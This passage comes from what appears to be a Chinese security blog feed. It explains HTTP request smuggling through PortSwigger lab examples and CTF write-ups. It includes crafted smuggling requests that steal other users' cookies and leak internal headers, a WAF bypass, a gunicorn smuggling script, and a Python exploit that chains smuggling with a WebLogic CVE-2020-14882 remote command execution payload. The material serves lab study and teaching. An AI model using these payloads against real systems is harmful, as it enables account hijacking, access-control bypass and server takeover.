class="hljs-number">2</span>F1.com&amp;comment=spring<br></code></pre></td></tr></table></figure><p>前端服务器使用CL验证，获取CL为333后判定这是一个正常的请求并发送给后端，而后端服务器通过TE的结尾表标识<code>0\r\n\r\n</code>认为前半部分是一个正常的请求，而后半部分：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/post/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>700<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">csrf</span>=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&amp;postId=<span class="hljs-number">6</span>&amp;name=a&amp;email=<span class="hljs-number">1</span>%<span class="hljs-number">40</span>qq.com&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F1.com&amp;comment=spring</span><br></code></pre></td></tr></table></figure><p>因为Pipeline的存在被放置在了缓存区。如果这时另一个正常用户也发来了一段评论，那么这个请求会被拼接到滞留在缓存区的请求后面构成一个新的请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/post/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>700<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">csrf</span>=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&amp;postId=<span class="hljs-number">6</span>&amp;name=a&amp;email=<span class="hljs-number">1</span>%<span class="hljs-number">40</span>qq.com&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F1.com&amp;comment=springPOST /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"><span class="hljs-attribute">Host</span>: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net</span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: session=ashAwdweas.......</span><br></code></pre></td></tr></table></figure><p>这时候我们就发现<strong>请求头被拼接到了comment的后面然后被当作comment返回</strong>，这样我们就可能通过获取到其他用户的Cookie。</p><p>在lab中我们要不断第二个CL的大小，调整至合适大小才有可能正常泄露出来；我从700开始服务器报500，但不知道是哪里出了问题响应一直超时：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220504223219276.png" class="" title="image-20220504223219276"><p>不过原理还是很好理解，大家可以自己去试一试，有点玄学。</p><h3 id="2-泄露请求头重写请求实现未授权访问"><a href="#2-泄露请求头重写请求实现未授权访问" class="headerlink" title="2.泄露请求头重写请求实现未授权访问"></a>2.泄露请求头重写请求实现未授权访问</h3><p>前面我们提到，前端服务器的作用之一就是过滤外界用户对于未授权接口的访问，一般前端用户收到一段请求后，会在包里添加一些请求头例如：</p><ul><li>用户的<code>session</code>等会话ID。</li><li>XFF头用于显示用户IP，当然一般不会是<code>X-Forwarded-For</code>因为很容易被猜到。</li><li>用户指纹信息、<code>token</code>等。</li></ul><p><strong>如果我们能泄露这些前端服务器向后端服务器中继发送的请求中的请求头，那么我们就可以伪造出前端服务器的请求包来完成对敏感接口的未授权访问，实现一些恶意操作。</strong></p><p>那么问题来了，我们如何能获取到前端服务器发送到后端服务器的请求头呢？其实不难想，如果服务器能对我们输入的POST参数，即body部分响应输出，然后我们构造一个普通的请求放在body后面，前端服务器接收到之后就会对我们添加的请求进行重写，如果我们的指定<code>Content-Length</code>为较大的值就会把前端服务器重写时添加的重要字段给泄露出来拼接到body后面，随后后端服务器会将其与响应一并返回。</p><p>这么讲可能还是有些抽象，我们拿lab来举例：</p><p><a href="https://acbc1f4d1e121980c02b64d600c40022.web-security-academy.net/">https://acbc1f4d1e121980c02b64d600c40022.web-security-academy.net/</a></p><p>构造出如下请求包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: acbc1f4d1e121980c02b64d600c40022.web-security-academy.net<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">100</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4896</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Cookie</span>: session=RcsAYo8SoCQx0bwXn0oG0G1RkLNPHuz4<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">77</span><br><span class="hljs-attribute">Transfer</span>-Encoding:chunked<br><br><span class="hljs-attribute">0</span><br><br><br><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>:close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">111</span><br><br></code></pre></td></tr></table></figure><p>多发送几次我们会发现成功泄露出来XFF头信息：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220504233348109.png" class="" title="image-20220504233348109"><p>我们简单捋一下过程便于理解，首先前端服务器通过CL判断出这是一个完整的请求并转发给后端服务器，后端服务器通过TE将<code>0</code>字节标识前的部分正常处理，后半部分也被看作是一次正常的请求但被滞留在缓存区，同时由于我们设置的CL是超过实际长度，缓存区就会等待下一次正常请求，也就是前端服务器发来的新请求截取其部分请求头放在请求参数后面凑够CL后一并返回。</p><p>我们走私到后端服务器被滞留在缓存区的请求是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>:close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">111</span><br><br></code></pre></td></tr></table></figure><p>后端服务器接收到新请求并拼接在search之后是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>:close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">111</span> POST / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> X-TsINOz-Ip: <span class="hljs-number">117.136.5.78</span> Host:......<br></code></pre></td></tr></table></figure><p>最后后端服务器就会将信息响应返回。</p><h3 id="3-其它应用"><a href="#3-其它应用" class="headerlink" title="3.其它应用"></a>3.其它应用</h3><p>除了这两种还有一些利用方式：</p><ul><li>反射型 XSS 组合拳</li><li>将 on-site 重定向变为开放式重定向</li><li>缓存投毒</li><li>缓存欺骗</li></ul><p>这些**@mengchen**师傅在知道创宇404发的paper里都有实验讲解，感兴趣的可以去看一看。(paper链接在文末)</p><h2 id="0x05-CTF实战利用"><a href="#0x05-CTF实战利用" class="headerlink" title="0x05 CTF实战利用"></a>0x05 CTF实战利用</h2><h3 id="GKCTF2021-hackme"><a href="#GKCTF2021-hackme" class="headerlink" title="GKCTF2021[hackme]"></a>GKCTF2021[hackme]</h3><p>这道题目首先是需要nosql注入爆出密码，然后登陆获得任意文件读取功能，前半部分我们暂且忽略，我们重点关注后半部分。</p><p>读取nginx配置文件发现后端存在weblogic服务：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505100631052.png" class="" title="image-20220505100631052"><p>同时注意到nginx版本为1.17.6，存在请求走私：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505100658589.png" class="" title="image-20220505100658589"><p>假如我们构造：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /a HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">56</span><br><span class="hljs-attribute">GET</span> /_hidden/index.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: notlocalhost<br></code></pre></td></tr></table></figure><p>那么nginx会把这两个请求都执行，这就会造成请求走私。可参考：<a href="https://v0w.top/2020/12/20/HTTPsmuggling/#5-2-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx-lt-1-8-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81">https://v0w.top/2020/12/20/HTTPsmuggling/#5-2-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx-lt-1-8-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81</a></p><p>针对这道题目我们构造出如下请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.buuoj.cn:27230<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/console/login/LoginForm.jsp</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>weblogic</span><br><span class="language-http"></span><br></code></pre></td></tr></table></figure><p>响应包中包含了weblogic的版本信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WebLogic</span> Server Version: <span class="hljs-number">12.2.1.4</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>版本正好契合CVE-2020-14882，我们直接拿socket去打就可以拿到flag。</p><h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">//来源于https://www.lemonprefect.cn的博客<br><span class="hljs-keyword">import</span> socket<br><br>sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sSocket.connect((<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26319</span>))<br>payload = <span class="hljs-string">b&#x27;&#x27;&#x27;HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]&#123;%22cmd.exe%22,%20%22/c%22,%20cmd&#125;%20:%20new%20String[]&#123;%22/bin/sh%22,%20%22-c%22,%20cmd&#125;;if(cmd%20!=%20null%20)&#123;%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125;%20currentThread.interrupt(); HTTP/1.1\r\nHost:weblogic\r\ncmd: /readflag\r\n\r\n&#x27;&#x27;&#x27;</span><br>sSocket.send(payload)<br>sSocket.settimeout(<span class="hljs-number">2</span>)<br>response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(response) &gt; <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(response.decode())<br>    <span class="hljs-keyword">try</span>:<br>        response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">break</span><br>sSocket.close()<br></code></pre></td></tr></table></figure><h3 id="RCTF2019-esay-calc"><a href="#RCTF2019-esay-calc" class="headerlink" title="RCTF2019[esay calc]"></a>RCTF2019[esay calc]</h3><h4 id="常规绕waf"><a href="#常规绕waf" class="headerlink" title="常规绕waf"></a>常规绕waf</h4><p>首先查看源码根据提示来到calc.php</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505092703693.png" class="" title="image-20220505092703693"><p>代码对特殊字符进行了一些过滤，注意到最后代码执行，我们传入：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">calc.php?num=;)phpinfo();<span class="hljs-regexp">//</span><br></code></pre></td></tr></table></figure><p>执行后发现：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505092950651.png" class="" title="image-20220505092950651"><p>明显是有waf不合法请求，有一种做法是<strong>参数前面加空格使服务器无法解析绕waf</strong>，再用ascii转码读文件：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">? num=readfile(<span class="hljs-built_in">chr</span>(<span class="hljs-number">47</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">102</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">49</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>).<span class="hljs-built_in">chr</span>(<span class="hljs-number">103</span>))<br></code></pre></td></tr></table></figure><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505094817900.png" class="" title="image-20220505094817900"><h4 id="走私绕waf"><a href="#走私绕waf" class="headerlink" title="走私绕waf"></a>走私绕waf</h4><p>注意到只要能让前端服务器报错我们就能突破前端waf限制；所以事实上我们还可以利用走私攻击绕waf，而且前面四种方式都是有效的，这里<strong>举两个例子</strong>，剩下几种大家可以自行尝试：</p><p>注意下面的请求中num前没有空格了。</p><h5 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL CL"></a>CL CL</h5><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505095522705.png" class="" title="image-20220505095522705"><h5 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL TE"></a>CL TE</h5><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505095701181.png" class="" title="image-20220505095701181"><h3 id="ISCC2022-让我康康"><a href="#ISCC2022-让我康康" class="headerlink" title="ISCC2022[让我康康!]"></a>ISCC2022[让我康康!]</h3><h4 id="分析与利用"><a href="#分析与利用" class="headerlink" title="分析与利用"></a>分析与利用</h4><p>​如果直接访问flag会爆403：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503003840356.png" class="" title="image-20220503003840356"><p>我们通过相应包的头部发现了gunicorn20.0，经查阅版本存在请求走私，具体可参考：</p><p><a href="https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/">https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/</a></p><p>通过给出的POC我们编写脚本成功实现请求走私，看到要求很明显是需要获取前端服务器请求头的来源IP名称来伪造本地访问获取flag：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503003038852.png" class="" title="image-20220503003038852"><p>那么我的思路就是多次发送请求，并且设置前一个请求的CL为超过实际请求体的较大数值；由于后端服务器设置Keep-Alive，所以它会误认为请求没有发送完毕，会继续等待；而这时候我们再给前端服务器发送一个请求，前端服务器就会把带有来源IP头部的http包发送给后端服务器，后端服务器接收足够上一包内CL的时候就会把这个泄露敏感凭证的包一并返回给客户端，从而造成了敏感信息泄露。</p><p>其实思路与上面讲到的应用实例2一样，<strong>只不过gunicorn20.0的走私漏洞是由于默认Sec-Websocket-Key的配置导致后端服务器会以xxxxxxxx为标识位，这就导致xxxxxxxx后面的部分会滞留在缓存区，可以认为是一种变种的CL TE走私。</strong></p><p>我们可以通过burp直接构造请求，<strong>但是由于Content-Length需要我们自定义，比如第一个Content-Length仅仅是计算到第一个手动添加的POST请求，所以构造的时候要额外小心。</strong></p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505002029215.png" class="" title="image-20220505002029215"><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505002302025.png" class="" title="image-20220505002302025"><p>当然我们直接写脚本拿socket发更直观。</p><h4 id="最终exp-1"><a href="#最终exp-1" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><br>secret_payload=<span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span><br><span class="hljs-string">Host: 59.110.159.206:7020\r</span><br><span class="hljs-string">Content-Length: 149\r</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">Sec-Websocket-Key1:x\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">xxxxxxxxPOST / HTTP/1.1\r</span><br><span class="hljs-string">Host:127.0.0.1\r</span><br><span class="hljs-string">secr3t_ip: 127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 150\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=abc\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">POST / HTTP/1.1\r</span><br><span class="hljs-string">Content-Length: 14\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=111\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>final_payload=<span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span><br><span class="hljs-string">Host: 59.110.159.206:7020\r</span><br><span class="hljs-string">Content-Length: 152\r</span><br><span class="hljs-string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">Sec-Websocket-Key1:x\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">xxxxxxxxGET /fl4g HTTP/1.1\r</span><br><span class="hljs-string">Host:127.0.0.1\r</span><br><span class="hljs-string">secr3t_ip: 127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 150\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=abc\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">POST / HTTP/1.1\r</span><br><span class="hljs-string">Content-Length: 14\r</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">search=111\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>test1 = <span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1\r</span><br><span class="hljs-string">Host: 127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 67\r</span><br><span class="hljs-string">Sec-Websocket-Key1:x\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">xxxxxxxxGET /fl4g HTTP/1.1\r</span><br><span class="hljs-string">Host:127.0.0.1\r</span><br><span class="hljs-string">Content-Length: 123\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">GET / HTTP/1.1\r</span><br><span class="hljs-string">Host: 127.0.0.1\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>test2=<span class="hljs-string">b&#x27;&#x27;&#x27;POST / HTTP/1.1</span><br><span class="hljs-string">Host: 59.110.159.206:7020</span><br><span class="hljs-string">Content-Length: 10</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string"></span><br><span class="hljs-string">search=123&#x27;&#x27;&#x27;</span><br><br>sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sSocket.connect((<span class="hljs-string">&quot;59.110.159.206&quot;</span>, <span class="hljs-number">7020</span>))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send</span>(<span class="hljs-params">payload</span>):<br>    <span class="hljs-built_in">print</span>(payload)<br>    sSocket.send(payload)<br>    sSocket.settimeout(<span class="hljs-number">2</span>)<br>    response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(response) &gt; <span class="hljs-number">0</span>:<br>        <span class="hljs-built_in">print</span>(response.decode())<br>        <span class="hljs-keyword">try</span>:<br>            response = sSocket.recv(<span class="hljs-number">2147483647</span>)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">break</span><br>    sSocket.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    send(final_payload)<br></code></pre></td></tr></table></figure><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505010110383.png" class="" title="image-20220505010110383"><h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><p><a href="https://regilero.github.io/tag/Smuggling/">https://regilero.github.io/tag/Smuggling/</a></p><p><a href="https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn">https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn</a></p><p><a href="https://paper.seebug.org/1048">https://paper.seebug.org/1048</a></p><p><a href="https://xz.aliyun.com/t/7501">https://xz.aliyun.com/t/7501</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>http请求走私</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2022-39197(CS&lt;=4.7.1 RCE)分析复现</title>
    <link href="/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/10/18/CVE-2022-39197%20CS%20RCE%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
    
